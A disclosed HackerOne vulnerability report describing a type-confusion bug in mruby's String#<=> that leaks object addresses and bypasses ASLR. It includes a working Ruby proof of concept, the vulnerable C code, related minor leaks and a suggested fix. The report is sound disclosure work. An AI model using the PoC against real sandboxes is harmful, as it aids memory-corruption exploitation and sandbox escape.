# Controlled address leak due to type confusion - ASLR bypass

## Report Details
- **Report ID**: 207321
- **URL**: https://hackerone.com/reports/207321
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-02-18T13:26:29.063Z
- **Disclosed**: 2017-03-14T21:24:39.696Z

## Reporter
- **Username**: aerodudrizzt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
There are several different places in which arguments are treated as fixnums without a prior check for their type. Since ```mrb_value``` is a union that holds all value types, it can cause a mixup between an object pointer and an integer value:
```cpp
typedef struct mrb_value {
  union {
    mrb_float f;
    void *p;
    mrb_int i;
    mrb_sym sym;
  } value;
  enum mrb_vtype tt;
} mrb_value;
```

PoC Script:
=======
```Ruby
class Integer
    def <=>(arg1)
        return arg1
    end
end

s = "hello"
s.<=>(1)
```
And the output varies between runs (because of ASLR) and between architecture (32/64 bit) and seems like this: ```-69972254725992``` meaning an address of: ```0x3fa3af631768```.

Vulnerable Code:
===========
The ```mrb_str_cmp_m``` function (```s.<=>()```) in ```string.c``` uses the ```<=>``` function of the argument, if the argument is not a string. That function can be overridden (like was demonstrated in the PoC), and the returned value is not checked to be a fixnum, while it is treated as a fixnum:
```cpp
  mrb_value str2;
  mrb_int result;

  mrb_get_args(mrb, "o", &str2);
  if (!mrb_string_p(str2)) {
    if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, "to_s"))) {
      return mrb_nil_value();
    }
    else if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, "<=>"))) {
      return mrb_nil_value();
    }
    else {
      mrb_value tmp = mrb_funcall(mrb, str2, "<=>", 1, str1);

      if (mrb_nil_p(tmp)) return mrb_nil_value();
      if (!mrb_fixnum(tmp)) {
        return mrb_funcall(mrb, mrb_fixnum_value(0), "-", 1, tmp);
      }
      result = -mrb_fixnum(tmp);
    }
  }
  else {
    result = mrb_str_cmp(mrb, str1, str2);
  }
  return mrb_fixnum_value(result);
```
This means that the PoC code gets ```tmp``` as the original string (since ```1.<=>(str1)``` returns ```str1```), and ```mrb_fixnum(tmp)``` will be the address of the string object. Since it is returned as ```-mrb_fixnum(tmp)``` our value was negative.

More minor examples:
------------------------
1. ```mrb_str_aref_m``` function in ```string.c``` does not check the fixnum's type. can cause only a very minor information-leak over the MSbit (pos < 0).
2. ```mrb_str_index``` function in ```string.c``` does not check the 2nd arg, but has no security implications.
3. ```mrb_str_rindex``` function in ```string.c``` does not check the 2nd arg, can again leak the MSbit of the address (again a vpos < 0 check).

Suggested Fix:
=========
Before the argument / returned value is treated as a fixnum, it should be checked to match it in type using the ```mrb_fixnum_p``` macro, or any other chosen way.

## Attachments
No attachments
